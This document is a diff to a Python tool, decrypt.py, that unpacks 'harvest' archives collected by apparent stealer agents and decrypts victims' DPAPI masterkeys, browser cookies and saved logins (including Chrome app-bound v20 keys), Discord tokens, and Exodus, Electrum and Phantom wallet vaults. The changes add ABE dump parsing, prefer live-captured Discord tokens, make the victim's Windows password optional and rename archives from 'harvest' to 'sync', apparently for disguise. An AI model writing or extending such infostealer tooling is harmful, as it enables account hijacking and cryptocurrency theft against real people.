@@ -4,18 +4,17 @@
 Point it at a harvest ZIP (or an extracted directory) and it walks everything
 that can be recovered offline, in this order:
 
-  dpapi     masterkeys from Protect/<SID>/ + the Windows password
-  browsers  Local State os_crypt keys, cookies and Logins (v10; v20 with a
-            SYSTEM masterkey), History and Web Data
-  discord   tokens from the raw LevelDB dump
+  dpapi     masterkeys from Protect/<SID>/ + the Windows password (optional)
+  browsers  ABE v20 TSV, Local State v10 keys, cookies, logins, history
+  discord   discord/token.txt, then encrypted LevelDB blobs
   wallets   Exodus seed, Electrum, Phantom vaults
   accounts  launcher accounts
 
 Usage:
-  ./decrypt.py harvest-*.zip                 # interactive, prompts for password
-  ./decrypt.py harvest-*.zip -p 'Password1'  # non-interactive
-  ./decrypt.py harvest-*.zip --list          # inventory only
-  ./decrypt.py harvest-*.zip --machinekey <40 hex>   # unlock v20 cookies
+  ./decrypt.py sync-*.zip                    # v20, Discord and ABE need no password
+  ./decrypt.py sync-*.zip -p 'Password1'     # legacy user DPAPI blobs
+  ./decrypt.py sync-*.zip --list             # inventory only
+  ./decrypt.py sync-*.zip --machinekey <40 hex>   # legacy v20 without ABE
 
 Dependencies: cryptography. plyvel only for Phantom, zstandard only for some
 Exodus payloads. Everything else is optional; the run tells you what it skipped.
@@ -521,7 +520,8 @@ def dump_browser(harvest, out, browser, keyring, system_keys, show):
     keys_file = browser / "keys.txt"
     browser_keys = []
     if keys_file.is_file():
-        for line in keys_file.read_text("utf-8", "replace").splitlines():
+        lines = keys_file.read_text("utf-8", "replace").splitlines()
+        for line in lines:
             # New agents unwrap the app-bound key live, so the AES key is
             # already here and SECURITY.hiv is not needed.
             if line.startswith("v20="):
@@ -529,11 +529,25 @@ def dump_browser(harvest, out, browser, keyring, system_keys, show):
                     browser_keys.append(bytes.fromhex(line[4:].strip().replace(":", "")))
                 except ValueError:
                     pass
-            elif line.startswith("app_bound="):
-                try:
-                    browser_keys.extend(unwrap_app_bound(line[10:].strip(), system_keys, keyring))
-                except Exception as exc:
-                    skipped(f"{label}: app-bound key failed", str(exc))
+        if not browser_keys:
+            for line in lines:
+                if line.startswith("app_bound="):
+                    try:
+                        browser_keys.extend(unwrap_app_bound(line[10:].strip(), system_keys, keyring))
+                    except Exception as exc:
+                        skipped(f"{label}: app-bound key failed", str(exc))
+    abe = browser / "abe"
+    if abe.is_dir():
+        for source in sorted(abe.glob("*.tsv")):
+            text = source.read_text("utf-8", "replace")
+            write(out, f"secrets/{label}-abe-{source.name}", text)
+            rows = max(0, len(text.splitlines()) - 1)
+            if source.name.startswith("cookies"):
+                harvest.counts["cookies"] += rows
+            elif source.name.startswith("passwords"):
+                harvest.counts["logins"] += rows
+            ok(f"{label}: ABE {source.stem}", f"{rows} rows")
+
     try:
         aes = unlock_local_state(keys_file, state, keyring)
     except Exception as exc:
@@ -975,7 +989,9 @@ def main():
     protect = root / "dpapi" / "Protect"
     sids = [p for p in protect.iterdir() if p.is_dir()] if protect.is_dir() else []
 
-    if sids and not (args.masterkey or password):
+    predecrypted = (root / "discord" / "token.txt").is_file() or any(
+        "v20=" in p.read_text("utf-8", "replace") for p in harvest.rel("keys.txt"))
+    if sids and not predecrypted and not (args.masterkey or password):
         if sys.stdin.isatty() and not args.quiet:
             p()
             p("  The harvested DPAPI blobs need the Windows password to open.", "dim")
@@ -991,7 +1007,7 @@ def main():
     if user_keys:
         ok("dpapi: masterkeys recovered", str(len(user_keys)))
     elif sids:
-        skipped("dpapi: no masterkey", "pass -p or --masterkey")
+        skipped("dpapi: no masterkey", "optional for legacy blobs")
     if args.system_masterkey:
         system_keys["*"] = bytes.fromhex(args.system_masterkey)
         ok("dpapi: SYSTEM masterkey supplied")
@@ -1012,7 +1028,13 @@ def main():
         skipped("no browser data")
 
     step(2, total, "discord")
-    tokens = find_tokens(harvest, user_keys)
+    token_file = root / "discord" / "token.txt"
+    live_tokens = []
+    if token_file.is_file():
+        live_tokens = [line.split("=", 1)[-1].strip()
+                       for line in token_file.read_text("utf-8", "replace").splitlines()
+                       if line.strip()]
+    tokens = live_tokens or find_tokens(harvest, user_keys)
     if tokens:
         write(out, "discord/tokens.txt", "\n".join(tokens) + "\n")
         harvest.counts["tokens"] = len(tokens)
@@ -1020,7 +1042,7 @@ def main():
         for token in tokens[:args.show]:
             bullet(clip(token, 22) if args.show else mask(token, 10))
     elif harvest.rel("*.ldb"):
-        skipped("discord: tokens still encrypted", "needs the masterkey")
+        skipped("discord: tokens still encrypted", "needs a masterkey or discord/token.txt")
     else:
         skipped("discord: no raw dump")
 
@@ -1054,9 +1076,9 @@ def main():
     p()
     p(f"  output: {out}", "dim")
     if not any(harvest.counts.values()) and sids:
-        warn("nothing was decrypted", "rerun with -p '<windows password>'")
+        warn("nothing was decrypted", "legacy harvest: rerun with -p '<windows password>'")
     elif harvest.counts["cookies"] == 0 and sids:
-        warn("no cookies decrypted", "supply -p (and --system-masterkey for v20)")
+        warn("no cookies decrypted", "check browsers/*/abe or supply -p for legacy blobs")
     if temp:
         shutil.rmtree(temp, ignore_errors=True)
 
